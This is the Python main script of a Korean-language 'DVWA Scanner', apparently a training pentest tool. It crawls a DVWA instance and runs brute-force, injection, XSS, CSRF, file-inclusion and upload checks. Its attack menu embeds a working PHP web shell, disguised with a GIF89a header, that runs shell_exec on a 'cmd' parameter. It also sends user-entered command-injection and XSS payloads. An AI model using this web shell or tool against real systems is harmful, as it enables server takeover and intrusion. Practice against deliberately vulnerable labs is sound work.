
import importlib
import pyfiglet
from tabulate import tabulate  
from termcolor import colored
import sys
import modules.brute as brute
import modules.crawler as crawler
import modules.csrf as csrf
import modules.exec_module as exec_module
import modules.file_include as file_include
import modules.upload as upload  # upload.py → file_upload로 alias 설정 (혼동 방지)
import modules.sqli as sqli
import modules.blind_sqli as blind_sqli
import modules.xss_d as xss_d
import modules.xss_r as xss_r
import modules.xss_s as xss_s
import modules.test as test
import modules.upload_attack as upload_attack
import modules.exec_attack as exec_attack
import modules.xss_r_attack as xss_r_attack

import requests
from bs4 import BeautifulSoup


from wcwidth import wcswidth

from rich.text import Text
import os
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

MODULES = {
    # "xss_d": "09_xss_d",
    # "xss_r": "10_xss_r",
    # "xss_s": "11_xss_s",
    # "upload": "05_upload",
    # "sqli": "06_sqli",
    # "sqli_blind": "07_sqli_blind",
    "crawler": "crawler",
    "brute": "brute",
    "exec": "exec_module",
    "upload": "upload"
}


def print_banner():
    banner = pyfiglet.figlet_format("DVWA Scanner", font="slant")
    colored_banner = colored(banner, color="green", attrs=["bold"])
    print(colored_banner)


def print_scanner_banner():
    banner = pyfiglet.figlet_format("Scan Mode", font="slant")
    print(colored(banner, color="green", attrs=["bold"]))

# help 출력
def print_help():
    help_text = """
[Options]
 -u : -u [URL] 스캔할 URL 입력
 -c : -u [URL] -c [COOKIE] 쿠키값 입력
 -k : -u [URL] -c [COOKIE] -k 크롤링
 -a : -u [URL] -c [COOKIE] -a 전체 스캔
 -v : -u [URL] -c [COOKIE] -v [VULN] 특정 취약점 스캔
 -s : -u [URL] -c [COOKIE] -[OPTIONS] -s [FILENAME] 결과 저장
 -l : -u [URL] -c [COOKIE] -l [LEVEL] -[OPTIONS] 보안 레벨 설정

[URL] : http://192.168.0.150/DVWA/logout.php
[COOKIE] : PHPSESSID=q58005qfc791fhnobcpo315a4s; security=high
[VULN] : brute, exec, csrf, file_include, upload, sqli, sqli_blind, xss_d, xss_r, xss_s, crawler

DEFAULT SAVE ROUTE : /var/dvwascanner/
"""
    print(colored(help_text, "white"))

# 결과 저장 함수
def save_result_to_file(filename, title, content):
    upload_dir = "uploads"
    os.makedirs(upload_dir, exist_ok=True)  # uploads 디렉터리 없으면 생성

    
    if not filename.startswith(upload_dir + "/"):
        filename = os.path.join(upload_dir, filename)

    try:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(f"== {title} ==\n")
            if isinstance(content, list):
                f.write(tabulate(content, headers="keys", tablefmt="fancy_grid") + "\n")
            else:
                f.write(str(content) + "\n")
        print(colored(f"[✓] 결과가 '{filename}' 파일에 저장되었습니다.", "cyan"))
    except Exception as e:
        print(colored(f"[!] 저장 실패: {e}", "red"))

# # 취약점 스캔 함수
# def run_scan(targets):
#     if "all" in targets:
#         selected_keys = MODULES.keys()
#     else:
#         selected_keys = targets

#     for key in selected_keys:
#         if key not in MODULES:
#             print(f"[!] 지원하지 않는 취약점: {key}")
#             continue

#         module_name = MODULES[key]
#         try:
#             module = importlib.import_module(f"modules.{module_name}")
#             print(colored(f"\n[+] 실행 중: {module_name}", "green"))
#             module.run()
#         except Exception as e:
#             print(colored(f"[!] {module_name} 실행 실패: {e}", "red"))

# CLI 기반 실행 함수
def cli_mode():
    print(colored("[*] CLI 모드: 자동으로 크롤링 모듈을 실행합니다...", "cyan"))
    import modules.crawler as crawler
    crawler.main()
    return

# 메뉴 모드 URL, COOKIE, LEVEL, SAVE 여부 입력받음
def get_basic_inputs():
    url = input(colored("[입력] URL: ", "white"))
    cookie = input(colored("[입력] Cookie (PHPSESSID 값만): ", "white"))
    level = input(colored("[입력] 보안 레벨 (low/medium/high): ", "white"))
    save_filename = input(colored("[입력] 저장할 파일 이름 (공백 시 저장 안 함): ", "white")).strip()

    cookie_str = f"PHPSESSID={cookie.strip()}"
    level_str = f"security={level.strip()}"
    return url, cookie_str, level_str, save_filename if save_filename else None


def pad(text, width):
    """한글, 이모지 포함 너비 기준 정렬용 패딩 함수"""
    return text + " " * (width - wcswidth(text))

# 메뉴 기반 실행 함수
def menu_mode():
    
    console = Console()

    vuln_items = [
        ("1", "🕷️  Crawling", "사이트 전체 경로 수집"),
        ("2", "🔐  Brute Force", "로그인 무차별 대입"),
        ("3", "📄  CSRF", "위조된 요청 테스트"),
        ("4", "💣  Command Injection", "시스템 명령 실행 확인"),
        ("5", "📁  File Inclusion", "파일 포함 취약점 테스트"),
        ("6", "📤  File Upload", "파일 업로드 취약점 테스트"),
        ("7", "🧬  SQL Injection", "SQL 쿼리 삽입 탐지"),
        ("8", "🕶️  Blind SQL Injection", "응답 기반 없는 SQLI"),
        ("9", "🌐  DOM XSS", "자바스크립트 기반 DOM XSS"),
        ("10", "💥  Reflected XSS", "입력 반사형 XSS"),
        ("11", "💾  Stored XSS", "DB 저장형 XSS"),
        ("12", "🚀  전체 모듈 실행", "모든 취약점 탐지 실행")
    ]

    console.print("\n[bold cyan]DVWA Scanner Menu[/bold cyan]\n")

    
    for no, vuln, desc in vuln_items:
        left = Text(f"[ {no} ] ", style="white")
        vuln_text = Text(vuln, style="bold red")
        right = Text(f" - {desc}", style="white")
        console.print(left + vuln_text + right)

    
    sub_menu = input(colored("\n선택: ", "white")).strip()

    # ==========================================================================

    if sub_menu == "1":
        url, cookie_str, level_str, filename = get_basic_inputs()
        print(colored("[*] 자동 크롤링을 시작합니다...", "cyan"))
        soup, headers, find_path_dic = crawler.main_crawl_only(url, cookie_str, level_str)
        print(colored("[*] 크롤링 완료", "green"))

        if find_path_dic:
            print(colored("\n[✓] 수집된 URL 및 파라미터 정보:", "yellow"))

            console = Console()
            table = Table(
                title="크롤링 결과",
                title_style="bold magenta",
                show_lines=True,            
                expand=True,                
                padding=(0, 1),
                border_style="white"
            )
            table.add_column("Method", style="red", justify="center")
            table.add_column("URL", style="cyan", no_wrap=False)
            table.add_column("Params", style="green", no_wrap=False)

            for item in find_path_dic:
                table.add_row(item["method"], item["url"].upper(), ", ".join(item["param"]))

            console.print(table)

            # 저장용 (tabulate 사용)
            result_table = tabulate(find_path_dic, headers="keys", tablefmt="fancy_grid")
            if filename:
                save_result_to_file(filename, "크롤링 결과", result_table)


    elif sub_menu == "2":
        url, cookie_str, level_str, save_filename = get_basic_inputs()
        print(colored("[*] 크롤링을 통해 브루트포스 대상 경로를 수집합니다...", "cyan"))
        soup, headers, find_path_dic = crawler.main_crawl_only(url, cookie_str, level_str)

        print(colored("[*] Brute Force 공격을 시도합니다...", "cyan"))
        result_table, attempt_table = brute.run(soup, headers, find_path_dic)

        
        brute_result_str = tabulate(result_table, headers="keys", tablefmt="fancy_grid") if result_table else "[!] 로그인 성공 결과 없음"
        
        brute_attempt_str = tabulate(attempt_table, headers="keys", tablefmt="fancy_grid") if attempt_table else "[!] 시도된 조합이 없습니다."

        if save_filename:
            content = f"== Brute Force 결과 ==\n{brute_result_str}\n\n== 시도된 ID/PW 조합 ==\n{brute_attempt_str}"
            save_result_to_file(save_filename, "Brute Force 결과", content)

    elif sub_menu == "3":
        url, cookie_str, level_str, save_filename = get_basic_inputs()
        print(colored("[*] 크롤링을 통해 대상 경로를 수집합니다...", "cyan"))
        soup, headers, find_path_dic = crawler.main_crawl_only(url, cookie_str, level_str)
        print(colored("[*] 크롤링 완료", "green"))

        print(colored("[*] CSRF 취약점 검사를 시작합니다...", "cyan"))
        
        # 결과 받아오기 (리치는 내부 출력만, 이 result는 딕셔너리 리스트)
        result = csrf.run(soup, headers, find_path_dic)

        # 저장 파일 있을 경우 tabulate로 저장 (Rich는 터미널에만 출력됨)
        if save_filename:
            save_result_to_file(save_filename, "CSRF 검사 결과", result)


    elif sub_menu == "4":
        url, cookie_str, level_str, save_filename = get_basic_inputs()
        print(colored("[*] 크롤링을 통해 Command Injection 대상 경로를 수집합니다...", "cyan"))
        soup, headers, find_path_dic = crawler.main_crawl_only(url, cookie_str, level_str)

        print(colored("[*] Command Injection 테스트를 시작합니다...", "cyan"))
        result = exec_module.run(soup, headers, find_path_dic)

        
        result_str = tabulate(result, headers="keys", tablefmt="fancy_grid") if result else "[!] 탐지된 결과 없음"
        

        if save_filename:
            content = f"== Command Injection 검사 결과 ==\n{result_str}"
            save_result_to_file(save_filename, "Command Injection 검사 결과", content)



    elif sub_menu == "5":
        
        url, cookie_str, level_str, save_filename = get_basic_inputs()
        print(colored("[*] 크롤링을 통해 File Inclusion 대상 경로를 수집합니다...", "cyan"))
        soup, headers, find_path_dic = crawler.main_crawl_only(url, cookie_str, level_str)

        print(colored("[*] File Inclusion 테스트를 시작합니다...", "cyan"))
        result = file_include.run(soup, headers, find_path_dic)

        
        result_str = tabulate(result, headers="keys", tablefmt="fancy_grid") if isinstance(result, list) else str(result)
        
        if save_filename:
            save_result_to_file(save_filename, "File Inclusion 결과", result)

    elif sub_menu == "6":
        url, cookie_str, level_str, filename = get_basic_inputs()
        print(colored("[*] 크롤링을 통해 File Upload 대상 경로를 수집합니다...", "cyan"))
        soup, headers, find_path_dic = crawler.main_crawl_only(url, cookie_str, level_str)

        print(colored("[*] File Upload 취약점 테스트를 시작합니다...", "cyan"))
        
        result = upload.run(soup, headers, find_path_dic, level_str.split("=")[1])

        if filename:
                save_result_to_file(filename, "File Upload 결과", result)
                
    elif sub_menu == "7":
        url, cookie_str, level_str, filename = get_basic_inputs()
        print(colored("[*] 크롤링을 통해 SQL Injection 대상 경로를 수집합니다...", "cyan"))
        soup, headers, find_path_dic = crawler.main_crawl_only(url, cookie_str, level_str)

        print(colored("[*] SQL Injection 취약점 테스트를 시작합니다...", "cyan"))
        
        result = sqli.run(soup, headers, find_path_dic, level_str.split("=")[1])


        if filename:
            save_result_to_file(filename, "SQL Injection 결과", result)

    elif sub_menu == "8":
        url, cookie_str, level_str, filename = get_basic_inputs()
        print(colored("[*] 크롤링을 통해 Blind SQL Injection 대상 경로를 수집합니다...", "cyan"))
        soup, headers, find_path_dic = crawler.main_crawl_only(url, cookie_str, level_str)

        print(colored("[*] Blind SQL Injection 취약점 테스트를 시작합니다...", "cyan"))
        
        result_output = blind_sqli.run(soup, headers, find_path_dic, level_str.split("=")[1])

        if result_output:
            print(colored("\n[✓] 취약점 탐지 결과:", "yellow"))
            print(result_output)

            if filename:
                save_result_to_file(filename, "Blind SQL Injection 결과", result_output)
        else:
            print(colored("[!] 탐지된 취약점이 없습니다.", "red"))
    
    elif sub_menu == "9":
        url, cookie_str, level_str, filename = get_basic_inputs()
        print(colored("[*] 크롤링을 통해 XSS_D 대상 경로를 수집합니다...", "cyan"))
        soup, headers, find_path_dic = crawler.main_crawl_only(url, cookie_str, level_str)

        print(colored("[*] XSS_D 취약점 테스트를 시작합니다...", "cyan"))
        
        result = xss_d.run(soup, headers, find_path_dic, level_str.split("=")[1])
            
        if filename:
            save_result_to_file(filename, "XSS_D 결과", result)
        
    
    elif sub_menu == "10":
        url, cookie_str, level_str, filename = get_basic_inputs()
        print(colored("[*] 크롤링을 통해 XSS_R 대상 경로를 수집합니다...", "cyan"))
        soup, headers, find_path_dic = crawler.main_crawl_only(url, cookie_str, level_str)

        print(colored("[*] XSS_R 취약점 테스트를 시작합니다...", "cyan"))
        
        result = xss_r.run(soup, headers, find_path_dic, level_str.split("=")[1])


        if filename:
                save_result_to_file(filename, "XSS_R 결과", result)
        

    elif sub_menu == "11":
        url, cookie_str, level_str, filename = get_basic_inputs()
        print(colored("[*] 크롤링을 통해 XSS_S 대상 경로를 수집합니다...", "cyan"))
        soup, headers, find_path_dic = crawler.main_crawl_only(url, cookie_str, level_str)

        print(colored("[*] XSS_S 취약점 테스트를 시작합니다...", "cyan"))
        
        result = xss_s.run(soup, headers, find_path_dic, level_str.split("=")[1])

        

        if filename:
            save_result_to_file(filename, "XSS_S 결과", result)

    elif sub_menu == "12":
        url, cookie_str, level_str, save_filename = get_basic_inputs()
        print(colored("[*] 전체 모듈을 순차적으로 실행합니다...", "cyan"))

        soup, headers, find_path_dic = crawler.main_crawl_only(url, cookie_str, level_str)

        # 보안 레벨 문자열 추출
        sec_level = level_str.split("=")[1]

        # 각 모듈 실행 후 딕셔너리로 결과 정리
        result_dict = {
            "Brute Force": brute.run(soup, headers, find_path_dic),
            "CSRF": csrf.run(soup, headers, find_path_dic),
            "Command Injection": exec_module.run(soup, headers, find_path_dic),
            "File Inclusion": file_include.run(soup, headers, find_path_dic),
            "File Upload": upload.run(soup, headers, find_path_dic, sec_level),
            "SQL Injection": sqli.run(soup, headers, find_path_dic, sec_level),
            "Blind SQL Injection": blind_sqli.run(soup, headers, find_path_dic, sec_level),
            "XSS DOM": xss_d.run(soup, headers, find_path_dic, sec_level),
            "XSS Reflected": xss_r.run(soup, headers, find_path_dic, sec_level),
            "XSS Stored": xss_s.run(soup, headers, find_path_dic, sec_level)
        }

        print(colored("[✓] 전체 모듈 실행 완료!", "green"))

        # 파일 저장 처리
        if save_filename:
            for title, content in result_dict.items():
                save_result_to_file(save_filename, f"{title} 결과", content)


# 메인 함수
def main():
    while True:
        if len(sys.argv) == 1:
            print_banner()
            print(colored("1. 취약점 스캔", "white"))
            print(colored("2. 공격", "white"))
            print(colored("3. help", "white"))
            print(colored("4. 종료", "red"))
            choice = input(colored("\n선택: ", "white")).strip()

            if choice == "1":
                print_scanner_banner()
                print(colored("1. CLI 옵션 입력 방식", "white"))
                print(colored("2. 메뉴 기반 입력 방식", "white"))
                print(colored("3. 뒤로가기", "white"))
                sub_choice = input(colored("선택: ", "white")).strip()
                if sub_choice == "1":
                    cli_mode()
                    break
                elif sub_choice == "2":
                    menu_mode()
                    break
                elif sub_choice == "3":
                    main()
                    break
                else:
                    print(colored("[!] 올바른 번호 선택하세요.", "red"))
            elif choice == "2":
                print(colored("\n[*] 예시: python scanner.py 2 -s xss_d xss_s", "white"))
                print(colored("1. File Upload", "white"))
                print(colored("2. Command Injection", "white"))
                print(colored("3. Xss_r", "white"))
                
                attack_choice = input(colored("선택: ", "white")).strip()

                if attack_choice == "1":
                    print(colored("[*] File Upload 공격을 실행합니다...", "cyan"))
                    url = input(colored("URL을 입력하시오 > ", "white")).strip()
                    cookie = input(colored("쿠키값을 입력하시오 > ", "white")).strip()
                    level = input(colored("보안 레벨을 입력하시오 (low/medium/high) > ", "white")).strip()

                    cookie_str = f"PHPSESSID={cookie}"
                    level_str = f"security={level}"
                    headers = {
                        "Cookie": f"{cookie_str}; {level_str}"
                    }
                    soup, headers, find_path_dic = crawler.main_crawl_only(url, cookie_str, level_str)

                    upload_target_url = next((item['url'] for item in find_path_dic if 'upload' in item['url']), None)

                    if not upload_target_url:
                        print(colored("[!] exec 취약점 URL을 찾을 수 없습니다.", "red"))
                    else:
                        print(colored(f"[✓] 탐지된 upload URL: {upload_target_url}", "cyan"))
                        php_code = b"""GIF89a<?php
                        if (isset($_GET['cmd'])) {
                            $cmd = $_GET['cmd'];
                            $output = shell_exec($cmd);
                            echo "<pre>$output</pre>";
                        }
                        ?>
                        <form method="GET">
                            <label for="cmd">Enter Command:</label>
                            <input type="text" name="cmd" id="cmd" placeholder="Enter command" />
                            <input type="submit" value="Execute" />
                        </form>
                        """ 
                        # php_code = input(colored("파일 내용을 입력하시오 : ", "white")).strip()
                        # php_code = bytes(php_code, "UTF-8")
                        upload_attack.run(upload_target_url, headers, php_code, find_path_dic, level) 
                    

                elif attack_choice == "2":
                    print(colored("[*] Command Injection 공격을 실행합니다...", "cyan"))

                    url = input(colored("URL을 입력하시오 > ", "white")).strip()
                    cookie = input(colored("쿠키값을 입력하시오 > ", "white")).strip()
                    level = input(colored("보안 레벨을 입력하시오 (low/medium/high) > ", "white")).strip()

                    cookie_str = f"PHPSESSID={cookie}"
                    level_str = f"security={level}"
                    headers = {
                        "Cookie": f"{cookie_str}; {level_str}"
                    }

                    soup, headers, find_path_dic = crawler.main_crawl_only(url, cookie_str, level_str)

                    print(colored(">> 공격 가능 페이로드 <<", "magenta"))
                    exec_module.run(soup, headers, find_path_dic)

                    
                    exec_target_url = next((item['url'] for item in find_path_dic if 'exec' in item['url']), None)

                    if not exec_target_url:
                        print(colored("[!] exec 취약점 URL을 찾을 수 없습니다.", "red"))
                    else:
                        print(colored(f"[✓] 탐지된 exec URL: {exec_target_url}", "cyan"))
                        payload = input(colored("공격할 페이로드를 입력하시오\n>> ", "white")).strip()
                        exec_attack.run(exec_target_url, headers, payload)

                elif attack_choice == "3":
                    print(colored("[*] Xss_r 공격을 실행합니다...", "cyan"))
                    url = input(colored("URL을 입력하시오 > ", "white")).strip()
                    cookie = input(colored("쿠키값을 입력하시오 > ", "white")).strip()
                    level = input(colored("보안 레벨을 입력하시오 (low/medium/high) > ", "white")).strip()

                    cookie_str = f"PHPSESSID={cookie}"
                    level_str = f"security={level}"
                    headers = {
                        "Cookie": f"{cookie_str}; {level_str}"
                    }
                    soup, headers, find_path_dic = crawler.main_crawl_only(url, cookie_str, level_str)

                    xss_target_url = next((item['url'] for item in find_path_dic if 'xss_r' in item['url']), None)
                    xss_r.run(soup, headers, find_path_dic, level)

                    if not xss_target_url:
                        print(colored("[!] xss 취약점 URL을 찾을 수 없습니다.", "red"))
                    else:
                        print(colored(f"[✓] 탐지된 xss URL: {xss_target_url}", "cyan"))
                        payload = input(colored("공격할 페이로드를 입력하시오\n>> ", "white")).strip()
                        xss_r_attack.run(xss_target_url, headers, payload)



            elif choice == "3":
                print_help()
                input(colored("\n[Enter]를 누르면 메뉴로 돌아갈시면 됩니다...", "white"))
            elif choice == "4":
                print(colored("\n[*] 프로그램을 종료합니다.", "white"))
                break
            else:
                print(colored("[!] 올바른 번호를 선택하세요.", "red"))
        elif len(sys.argv) > 1 and sys.argv[1] == "2":
            sys.argv.pop(1)
            cli_mode()
            break
        else:
            print(colored("[!] 올바른 사용법이 아닙니다. python scanner.py 로 실행해보세요.", "red"))

if __name__ == "__main__":
    main()
